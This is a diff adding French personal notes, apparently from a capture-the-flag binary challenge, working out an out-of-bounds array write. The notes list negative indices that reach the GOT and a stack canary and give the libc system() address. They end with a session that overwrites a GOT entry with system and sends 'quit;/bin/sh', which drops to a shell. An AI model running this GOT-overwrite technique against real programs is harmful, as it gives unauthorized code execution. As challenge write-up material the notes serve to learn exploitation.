@@ -1,3 +1,38 @@
 store ecrit a 0xffffda34 + index * 4
 on peut pas trop ecraser les EIP a cause de son check
 idk
+
+
+
+
+on ecrit a 0xffffd578 + index * 4
+
+ON PEUT OVERWRITE LE GOT
+-1040108889 = stack_check gdb
+-1040108885 = sand gdb
+
+
+FAUT ECRASER 0xffffd6ec pour le canary
+
+system = 0xf7e6aed0 = 4159090384
+
+
+Input command: read
+ Index: -1040108872 
+ Number at data[3254858424] is 0
+ Completed read command successfully
+Input command: read
+ Index: -1040108885
+ Number at data[3254858411] is 134513846
+ Completed read command successfully
+Input command: store
+ Number: 4159090384
+ Index: -1040108885
+ Completed store command successfully
+Input command: store
+ Number: 1
+ Index: 106
+ Completed store command successfully
+Input command: quit;/bin/sh
+sh: 1: quit: not found
+$
